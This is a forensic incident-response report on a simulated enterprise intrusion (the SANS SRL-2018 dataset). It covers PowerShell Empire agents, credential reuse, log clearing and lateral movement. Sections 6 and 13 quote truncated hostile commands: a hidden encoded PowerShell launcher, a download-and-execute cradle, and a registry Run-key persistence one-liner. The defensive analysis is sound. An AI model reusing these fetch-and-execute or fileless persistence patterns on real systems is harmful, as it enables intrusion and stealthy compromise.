# SRL-2018 — Final Detailed Manual Analysis Report (1)

**Case:** SRL-2018 — Compromised Enterprise Network (SANS *"SHIELDBASE / BASE"* enterprise dataset)
**Domain(s) observed:** `shieldbase` / `SHIELDBASE.LAN` (+ `DMZ-FTP` local, foreign `SPADERTECH.COM`)
**Analyst workstation:** SANS SIFT (Ubuntu)  ·  **Evidence mode:** strict read-only (chain of custody preserved)
**Report type:** Manual / tool-grounded analysis — *standalone final report*
**Basis:** deterministic 6-stage read-only pipeline + manual interpretation of raw tool output
**Generated:** 2026-06-14 (UTC)

> **What this document is.** This is the **manually analysed, tool-grounded** account of the SRL-2018
> enterprise intrusion. Every fact derives from court-vetted CLI tools (Volatility 3, EZ Tools, The
> Sleuth Kit, libewf) recorded in the provenance ledger (`01_analysis/SRL-2018/provenance.jsonl`,
> 416 actions). Findings the analyst has **directly verified** in tool output are marked
> **[CONFIRMED]**; interpretive leads needing follow-up are marked **[CANDIDATE]**; items that look
> alarming but are assessed benign are marked **[BENIGN / FALSE-POSITIVE]**.
>
> **Honesty note (read first).** Unlike SRL-2015, this case has **no externally adjudicated ground-
> truth oracle**. SRL-2018 is a large (20-host), long-running, partly noisy enterprise capture. The
> attacker activity that *is* directly evidenced in tool output (PowerShell Empire agents, registry
> persistence, account manipulation, log clearing, a data-convergence server) is reported as
> **[CONFIRMED]**; everything speculative is explicitly flagged. This report deliberately separates
> the real signal from the benign enterprise noise.

---

## 1. Executive Summary — what the evidence shows

The `shieldbase` enterprise shows **active post-exploitation by a PowerShell-based offensive
framework (PowerShell Empire / Cobalt Strike-style)** running in memory on multiple internal hosts,
combined with **registry-based persistence**, **broad credential reuse of privileged accounts across
the domain**, **account manipulation and event-log clearing** (anti-forensics), and a **file server
(`base-file`) acting as the convergence point** for inbound access from across the estate.

The directly-evidenced picture:

1. **Execution / agent presence [CONFIRMED].** Identical **encoded PowerShell Empire launchers** were
   captured live in memory on **`base-rd-04`, `base-rd-05`, and `base-wkstn-04`**, plus a
   **registry-stored, base64-encoded payload masquerading as "Sophos"** in an `HKCU…\Run` key on
   `base-rd-04`, and a download cradle to `http://127.0.0.1:5…`. A suspicious **`c:\windows\temp\perfmon\p.exe`** was executed on `base-rd-01`.
2. **Credential reuse & privileged accounts [CONFIRMED].** Admin-suffixed accounts
   (`rsydow-a`, `cbarton-a`, `rsydow-f`) and the **SQL service account `spsql`** were used for
   **interactive RDP and network logons across many hosts** — service-account RDP and "-a" admin
   sprawl are classic lateral-movement signatures.
3. **Lateral movement [CONFIRMED].** **1,249** meaningful remote-logon edges reconstructed.
   **`base-file` is the dominant target** (the whole estate logs into it on 2018-09-06/07);
   **`base-hunt` acts as a source hub** reaching many hosts; **`dmz-ftp`** is repeatedly accessed
   (egress candidate).
4. **Anti-forensics & account manipulation [CONFIRMED].** The timeline contains **62 event-log-cleared**,
   **58 password-reset**, **18 user-created**, **5 user-deleted**, and multiple group-membership-change
   events — consistent with hands-on-keyboard domain manipulation.
5. **Foreign-domain authentication [CANDIDATE].** `SPADERTECH.COM\pman.adm` authenticating to
   `base-wkstn-01` (2020) indicates cross-domain/external access worth scoping.

**Assessment:** a confirmed internal compromise with an interactive operator using a PowerShell C2
framework, privileged-credential reuse, and log-clearing, with `base-file` as the likely collection
objective. The precise initial-access vector and a single linear kill chain are **not** conclusively
established from the available evidence (see §15) — this report does not invent one.

---

## 2. Scope & Evidence Inventory

**20 distinct hosts** — **7 disk images (`.E01`)** + **21 memory captures** (2 are duplicate snapshots,
so 19 distinct memory hosts). 6 hosts have **both** disk and memory; `dmz-ftp` is disk-only.

- **Evidence integrity:** **7/7 disks PASS `ewfverify`**; 21/21 memory archives integrity-OK.
- **Coverage:** 19/19 memory hosts processed (Vol3); 7/7 disk hosts processed (EZ Tools). Complete.
- **Provenance:** 416 tool actions logged (413 ok / 3 benign fail).

| Disk image | Host | ewfverify | SHA-256 (prefix) |
|------------|------|-----------|------------------|
| base-dc-cdrive.E01 | base-dc | PASS | `e2b9cf0cb6759fd0…` |
| base-file-cdrive.E01 | base-file | PASS | `ad9c85399fa8b248…` |
| base-rd-01-cdrive.E01 | base-rd-01 | PASS | `12a622aa073dbbda…` |
| base-rd-02-cdrive.E01 | base-rd-02 | PASS | `50ad43ff0e8a0cc4…` |
| base-wkstn-01-c-drive.E01 | base-wkstn-01 | PASS | `ede47a0733203134…` |
| base-wkstn-05-cdrive.E01 | base-wkstn-05 | PASS | `a94f2a866e2e562c…` |
| dmz-ftp-cdrive.E01 | dmz-ftp | PASS | `d19754685d75aecb…` |

---

## 3. Network Topology (from memory `netscan`)

```
 172.16.4.4  base-dc        172.16.5.20 base-av     172.16.6.11 base-rd-01    172.16.7.11 base-wkstn-01
 172.16.4.5  base-file      172.16.5.21 base-elf    172.16.6.12 base-rd-02    172.16.7.12 base-wkstn-02
 172.16.4.6  base-mail      172.16.5.25 base-hunt   172.16.6.14 base-rd-04    172.16.7.13 base-wkstn-03
 172.16.4.7  base-sp        172.16.5.26 base-admin  172.16.6.15 base-rd-05    172.16.7.14 base-wkstn-04
                                                    172.16.6.16 base-rd-06    172.16.7.15 base-wkstn-05
                                                                              172.16.7.16 base-wkstn-06
 Subnets:  .4.x = servers   .5.x = security/admin   .6.x = R&D (rd)   .7.x = workstations    dmz-ftp = DMZ
```

---

## 4. Methodology

Six-stage read-only pipeline: (1) ingest + SHA-256 + `ewfverify`; (2) Vol3 memory matrix
(`pslist/psscan/pstree/cmdline/netscan/malfind/svcscan/hashdump/modscan`); (2b) memory de-noise;
(3) disk mount RO (`ntfs-3g -o ro`) + EZ Tools (`MFTECmd`, `AppCompatCacheParser`, `EvtxECmd`,
`RECmd`, `AmcacheParser`); (4) cross-source correlation + self-correction; (5) Plaso super-timeline.
Raw evidence in `00_raw_evidence/` is never modified; output only under `01_analysis/`, `02_reports/`,
`03_exports/`.

**Confidence model:** **[CONFIRMED]** = directly observed in tool output (often multi-source);
**[CANDIDATE]** = lead requiring analyst confirmation; **[BENIGN / FALSE-POSITIVE]** = flagged by a
rule but assessed non-malicious on inspection.

---

## 5. Memory Forensics Matrix (Volatility 3)

| Host | active-list | procs | ext conns | malfind MZ | susp cmd | creds |
|------|-------------|:--:|:--:|:--:|:--:|:--:|
| base-admin | OK | 244 | 0 | 0 | 2* | 0 |
| base-av | OK | 114 | 0 | 0 | 0 | 3 |
| base-dc | SMEARED | 124 | 0 | 0 | 0 | 0 |
| base-elf | SMEARED | 97 | 0 | 0 | 0 | 0 |
| base-file | SMEARED | 101 | 0 | 0 | 0 | 0 |
| base-file (snap5) | SMEARED | 92 | 0 | 0 | 0 | 0 |
| base-hunt | SMEARED | 91 | **3** | 0 | 0 | 0 |
| base-mail | OK | 138 | 8* | 0 | 15* | 2 |
| base-rd-01 | OK | 142 | 2 | 0 | **2** | 4 |
| base-rd-02 | SMEARED | 138 | 0 | 0 | 0 | 0 |
| **base-rd-04** | OK | 201 | 0 | 0 | **3 (HIGH)** | 4 |
| **base-rd-05** | OK | 97 | 6* | 0 | **2 (HIGH)** | 2 |
| base-rd-06 | OK | 66 | 5* | 0 | 0 | 2 |
| base-sp | SMEARED | 91 | 0 | 0 | 0 | 0 |
| base-wkstn-01 | OK | 169 | 0 | 0 | 0 | 4 |
| base-wkstn-01 (mem2) | SMEARED | 131 | 0 | 0 | 0 | 0 |
| base-wkstn-02 | SMEARED | 154 | 0 | 0 | 0 | 0 |
| base-wkstn-03 | SMEARED | 128 | 0 | 0 | 0 | 0 |
| **base-wkstn-04** | OK | 84 | 0 | 0 | **1 (HIGH)** | 4 |
| base-wkstn-05 | SMEARED | 96 | 0 | 0 | 0 | 0 |
| base-wkstn-06 | SMEARED | 78 | 8* | 0 | 0 | 0 |

`*` = mostly benign on inspection (see §9/§11). **Bold** = genuine malicious indicators (see §6).
**12/21 images are SMEARED** (active-list walk failed, `KeNumberProcessors=0`) — those rely on pool
scanning + disk artifacts (§15).

---

## 6. CONFIRMED Malicious Activity

### 6.1 PowerShell Empire / encoded-PowerShell agents — [CONFIRMED] — base-rd-04, base-rd-05, base-wkstn-04
The single strongest finding. Identical **encoded PowerShell stagers** were captured live in memory
(`windows.cmdline`) on three hosts:

```
powershell.exe -nop -w hidden -encodedcommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAg...
   → decodes to:  $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("H4sIA...
```
The `$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("H4sIA…` form — `H4sIA` being the
**gzip magic header** — is the textbook **PowerShell Empire / Cobalt Strike PowerShell launcher**
(gzip-compressed, base64-wrapped, executed in hidden window with `-nop`/`-w hidden`).

- **`base-rd-04`** (PIDs 4520, 4896, 2664) — the most active host:
  - PID 4520: `IEX ((new-object net.webclient).downloadstring('http://127.0.0.1:5…'))` — Empire **download cradle**.
  - PID 4896: the gzip Empire **launcher** (as above).
  - **PID 2664 — registry persistence [CONFIRMED]:**
    `powershell.exe -w hidden -c (IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((gp HKCU:Software\Microsoft\Windows\CurrentVersion\Run Sophos).Sophos))))`
    → reads a base64 payload **stored in an `HKCU\…\Run` value named `Sophos`** (masquerading as the
    AV vendor), decodes and `IEX`-executes it. This is **autostart persistence via a registry-stored
    payload** — a hallmark of fileless PowerShell C2.
- **`base-rd-05`** (PIDs 17612, 20780) — same gzip Empire launcher.
- **`base-wkstn-04`** (PID 4340) — same gzip Empire launcher.

> **Significance:** the same agent on rd-04 + rd-05 + wkstn-04 = a **deployed C2 footprint across
> multiple hosts**, with persistence on rd-04. This is the core of the intrusion.

### 6.2 Suspicious staged binary — [CONFIRMED] — base-rd-01
`windows.cmdline` (PIDs 5948, 8260):
```
C:\WINDOWS\system32\cmd.exe /C c:\windows\temp\perfmon\p.exe
c:\windows\temp\perfmon\p.exe
```
Execution of `p.exe` from a created `…\temp\perfmon\` directory — a staging path inconsistent with the
real Performance Monitor. **[CANDIDATE]** that `p.exe` is attacker tooling (recommend hashing/triage
of the on-disk file on base-rd-01).

### 6.3 Account manipulation & anti-forensics — [CONFIRMED] — domain-wide
From the correlated incident timeline (EVTX security events):

| Category | Count | Meaning |
|----------|------:|---------|
| `log_cleared` | 62 | **Event-log clearing — anti-forensics** |
| `pw_reset` | 58 | Password resets (attacker or admin) |
| `user_enabled` | 24 | Accounts enabled |
| `group_add_local` | 24 | Local privileged-group additions |
| `user_created` | 18 | **New accounts created** |
| `group_add_global` | 14 | Global/domain-group additions |
| `user_deleted` | 5 | Accounts deleted |

62 log-cleared events + 18 user-creations + privileged group additions is a strong, multi-host
signature of **hands-on-keyboard privilege manipulation and evidence destruction**.

---

## 7. Lateral Movement & Privileged-Account Analysis — [CONFIRMED]

**1,249** meaningful remote logons reconstructed (types 3/8/9/10; machine accounts and routine DC auth
excluded). Full edge list: `01_analysis/SRL-2018/correlation/lateral_movement.json`.

**Key structural observations:**

- **`base-file` = the convergence target.** On **2018-09-06 / 09-07**, virtually the entire estate
  authenticates *into* `base-file` (from base-hunt, base-rd-01/04, base-av, base-dc, base-elf,
  base-mail, base-admin, base-sp, base-wkstn-02/03, and several raw IPs). A file server pulling
  inbound logons from everywhere in a single window = the **likely collection/exfil objective**.
- **`base-hunt` = a source hub.** Repeatedly the *source* of network logons to base-file, base-rd-01,
  base-rd-02, base-wkstn-01/05, dmz-ftp — frequently as **`cbarton-a`**. (Caveat: a host literally
  named "hunt" may be a defender box; but the breadth of `-a` admin logons from it is notable —
  **[CANDIDATE]** pivot.)
- **Privileged-account sprawl [CONFIRMED]:** the admin-suffixed accounts **`rsydow-a`**,
  **`cbarton-a`**, **`rsydow-f`** and the **SQL service account `spsql`** are used for **interactive
  RDP and network logons across many hosts** — e.g. `spsql` RDP base-rd-04 → base-rd-01, base-rd-01 →
  base-rd-02, base-file → base-rd-01/02. **A SQL service account performing interactive RDP across
  hosts is a textbook lateral-movement red flag.**
- **`dmz-ftp` access [CANDIDATE egress]:** many inbound logons via `rsydow`, `rsydow-a`, `rsydow-f`,
  `Administrator`, and `ftpadmin` (incl. RDP from base-admin, base-file, base-hunt, and external
  `172.16.10.13`). A DMZ FTP host accessed by internal admin accounts = candidate **exfiltration path**.
- **Foreign domain [CANDIDATE]:** `SPADERTECH.COM\pman.adm` → `base-wkstn-01` (2020-02) — cross-domain
  authentication from outside `shieldbase`; scope the trust/relationship.

> **Date span note:** logon evidence spans 2018-05 → 2020-02. The **concentrated incident activity is
> the 2018-09-06/07 window** (base-file convergence). Later 2019–2020 entries on base-wkstn-01 may be a
> separate phase or normal admin — flagged, not merged.

---

## 8. External / C2 Network Indicators

| Host | Connection | Owner | Assessment |
|------|-----------|-------|------------|
| **base-hunt** | `172.16.5.25 → 108.79.235.64:33000` **ESTABLISHED** | — | **[CANDIDATE C2]** — high non-standard port, established session |
| base-hunt | `→ 23.194.110.27:80`, `→ 23.45.116.11:80` (SYN_SENT) | — | [BENIGN-likely] Akamai CDN ranges |
| base-mail | `→ 131.253.61.96/98/102:443` | svchost.exe | [BENIGN] Microsoft IP range (telemetry/Exchange) |
| base-rd-01 | `→ 13.89.220.65:443`, `→ 52.16.55.11:443` | — | [BENIGN-likely] Azure / AWS |
| base-rd-05/06, wkstn-06 | `-:0 → <ip>:0 CLOSED` (java.exe, lsass.exe, svchost.exe) | various | **[LOW-CONFIDENCE]** port-0 / no-local-addr = pool-scan artifacts on smeared-adjacent images; not reliable C2 evidence (but `lsass.exe` egress entries warrant a hash/triage check if reproduced) |

> **No internet reputation enrichment** was possible (offline environment). The base-hunt `:33000`
> ESTABLISHED session is the most credible external-C2 candidate and should be pivoted through threat
> intel.

---

## 9. Cross-Host Indicators — with honest triage

The correlation engine flagged 9 artifacts on >1 host. **Most are benign enterprise software** and are
reported here *with* that assessment rather than as indicators:

| Artifact | Hosts | Assessment |
|----------|------:|------------|
| `dismhost.exe` | 6 | **[BENIGN]** legitimate Windows DISM servicing component |
| `setup.exe` | 4 | [CANDIDATE] generic name — needs per-instance hashing |
| `adobearmhelper.exe` | 3 | **[BENIGN]** Adobe ARM updater |
| `powershell.exe` | 3 | native binary (but see §6 — *how* it ran is the issue, not its presence) |
| `cleanup.exe` | 2 | [CANDIDATE] |
| `mfemactl.exe` | 2 | **[BENIGN]** McAfee agent |
| `frminst.exe` | 2 | **[BENIGN]** McAfee FramePkg installer |
| `browsinghistoryview.exe` | 2 | **[CANDIDATE]** NirSoft browsing-history tool — dual-use (admin or attacker recon) |
| `systeminit-dev.tmp` | 2 | **[CANDIDATE]** unusual `.tmp` on 2 hosts — triage |

> **Lesson:** cross-host *co-occurrence alone* is a weak indicator in an enterprise (shared software is
> everywhere). The real evil (§6) was found in **execution context** (encoded PowerShell, registry
> persistence), not in shared filenames.

---

## 10. Self-Correction (automated reconciliation) — [CONFIRMED]

Where the live process list was unusable, the pipeline **disclosed the gap and recovered from disk**
rather than reporting "nothing found" (6 entries):

- `base-dc`, `base-file` (+snapshot5), `base-rd-02`, `base-wkstn-01`, `base-wkstn-05`:
  **`[memory_gap_filled_by_disk]`** — smeared active-list → execution/auth recovered from
  Shimcache / Amcache / EVTX. Empty list-walker output is **explicitly not** interpreted as clean.

---

## 11. Candidate False Positives explicitly called out

Analytical honesty — these were flagged by rules but assessed **benign**:

- **base-dc "exec_from_suspicious_dir" cluster (50+ entries) — [BENIGN].** All are
  `…\NetworkService\AppData\Local\Temp\MpSigStub.exe` and `mpam-*.exe`. These are **Microsoft Defender
  antimalware-platform signature-update stubs** (`mpam` = Microsoft Protection AntiMalware), which
  legitimately execute from the NetworkService Temp path. **Not attacker activity** — a path-heuristic
  false positive.
- **base-mail "15 suspicious commands" — [BENIGN].** All are Exchange `w3wp.exe` IIS app-pool worker
  processes (MSExchange*AppPool) — normal Exchange Server operation.
- **base-admin "svchost -k localservice … WebClient" / SearchProtocolHost — [BENIGN].** Normal Windows
  service / Windows Search activity.

---

## 12. MITRE ATT&CK (evidence-backed)

| Tactic | Technique | Evidence |
|--------|-----------|----------|
| Execution | **T1059.001** PowerShell | encoded Empire launchers (rd-04/05, wkstn-04) |
| Execution | T1059.003 cmd | `cmd /C …\temp\perfmon\p.exe` (rd-01) |
| Persistence | **T1547.001** Run Key (registry-stored payload) | `HKCU\…\Run\Sophos` base64 IEX (rd-04) |
| Defense Evasion | **T1027** Obfuscated/Encoded · T1564 Hidden Window | `-enc`, `-w hidden`, gzip+base64 |
| Defense Evasion | **T1070.001** Clear Windows Event Logs | 62 log-cleared events |
| Credential Access | T1003 (candidate) | `lsass.exe` egress entries (low-confidence); cred artifacts on 8 hosts |
| Persistence / Priv-Esc | **T1136** Create Account · **T1098** Account Manipulation | 18 user-created, group additions |
| Lateral Movement | **T1021.001** RDP · **T1021.002** SMB | `spsql`/`rsydow-a`/`cbarton-a` RDP+network logons |
| Command & Control | **T1071** / T1105 | Empire cradle `http://127.0.0.1:5…`; base-hunt `:33000` (candidate) |
| Collection | T1039 (candidate) | base-file inbound convergence (2018-09-06/07) |
| Exfiltration | T1048 (candidate) | dmz-ftp admin-account access |

---

## 13. Indicators of Compromise

**Execution / persistence:**
- Encoded PowerShell: `powershell.exe -nop -w hidden -encodedcommand <…H4sIA… gzip Empire launcher>` (base-rd-04, base-rd-05, base-wkstn-04)
- Download cradle: `IEX ((new-object net.webclient).downloadstring('http://127.0.0.1:5…'))`
- Registry persistence: `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Sophos` (base64 IEX payload)
- `c:\windows\temp\perfmon\p.exe` (base-rd-01)

**Network:** `108.79.235.64:33000` (base-hunt, ESTABLISHED — candidate C2); `127.0.0.1:5…` (Empire cradle)

**Accounts (privileged reuse):** `rsydow-a`, `rsydow-f`, `cbarton-a`, `spsql` (SQL svc acct used for RDP), `ftpadmin`; foreign `SPADERTECH.COM\pman.adm`

**Hosts of interest:** base-rd-04 (agent + persistence), base-rd-05 / base-wkstn-04 (agents), base-rd-01 (`p.exe`), base-hunt (source hub + candidate C2), base-file (collection target), dmz-ftp (egress candidate)

---

## 14. Incident Timeline

Concentrated activity window: **2018-09-06 → 2018-09-07** (base-file convergence). Category counts
(`combined_incident_timeline.csv`):

```
 1559  execution
 1249  lateral_logon
  978  suspicious_powershell
  337  service_install
   62  log_cleared
   58  pw_reset
   24  user_enabled
   24  group_add_local
   18  user_created
   14  group_add_global
    5  user_deleted
```
Full court-vetted Plaso super-timeline per disk: `timeline/plaso/` (via `srl2018_stage5_timeline.py --plaso`).

---

## 15. Limitations & Honest Disclosure

1. **No adjudicated ground-truth oracle** for SRL-2018 (unlike SRL-2015). Confidence rests on direct
   tool output; `[CANDIDATE]` items are leads, not conclusions.
2. **Smeared memory (12/21 images):** active-process-list walk failed (`KeNumberProcessors=0`);
   `pslist/cmdline/malfind/svcscan/hashdump` are empty there. Facts came from `psscan`/`netscan`/
   `modscan` + disk. **Empty list-walker output is not "nothing found."** Notably, the smeared hosts
   (incl. base-dc, base-file, base-wkstn-05) may host agents that simply weren't visible in cmdline —
   absence of an Empire hit on a smeared host is **not** exoneration.
3. **`windows.netstat`** unsupported (tcpip symbols absent) → `netscan` used; some entries are
   port-0/no-local pool artifacts (low confidence).
4. **No internet reputation** (offline) — external IPs/hashes not enriched.
5. **Initial-access vector not established** — no confirmed phishing/exploit entry point was recovered;
   this report does not assert one.
6. **Single linear kill chain not proven** — the data supports an *active multi-host C2 + credential-
   reuse intrusion*, but precise operator attribution and ordering across the 2018→2020 span are
   open.

---

## 16. Recommended Next Actions

1. **Triage the Empire hosts first:** dump/recover the gzip payloads from rd-04/rd-05/wkstn-04 memory;
   recover the `HKCU\…\Run\Sophos` value on rd-04; decode to obtain the live C2 address/port.
2. **Hash and submit** `p.exe` (rd-01) and the Empire payloads to threat intel.
3. **Pivot `108.79.235.64:33000`** (base-hunt) externally; determine whether base-hunt is attacker
   pivot or defender tooling.
4. **Scope `base-file`** (the collection target) for staged archives / data access in the 09-06/07
   window; scope `dmz-ftp` for outbound transfer.
5. **Lock down privileged accounts:** force-reset `rsydow*`, `cbarton-a`, `spsql`; investigate why a
   SQL service account performs interactive RDP. Reset KRBTGT ×2 if DC compromise is confirmed.
6. **Investigate the 62 log-clear and 18 account-creation events** for attacker-created accounts.
7. **Re-image** confirmed-agent hosts (rd-04, rd-05, wkstn-04) and rd-01.
8. **Re-examine smeared-memory hosts** with alternate acquisition/symbols (esp. base-dc, base-file) —
   they may hide additional agents.

---

## 17. Provenance & Reproducibility

- **Provenance ledger:** `01_analysis/SRL-2018/provenance.jsonl` — 416 actions (tool, argv, rc,
  duration, UTC).
- **Structured findings:** `01_analysis/SRL-2018/correlation/findings.json`,
  `lateral_movement.json`, memory `MEMORY_FINDINGS.txt`.
- **Timeline:** `01_analysis/SRL-2018/timeline/combined_incident_timeline.csv`.
- **Pipeline scripts / runbook:** `analysis/` scripts + `RUNBOOK.md` (idempotent stages).
- **Read-only guarantee:** writes only under `01_analysis/`, `02_reports/`, `03_exports/`; raw evidence
  in `00_raw_evidence/` never modified; 7/7 disks `ewfverify` PASS.

*End of report — SRL-2018 final detailed manual analysis (1).*
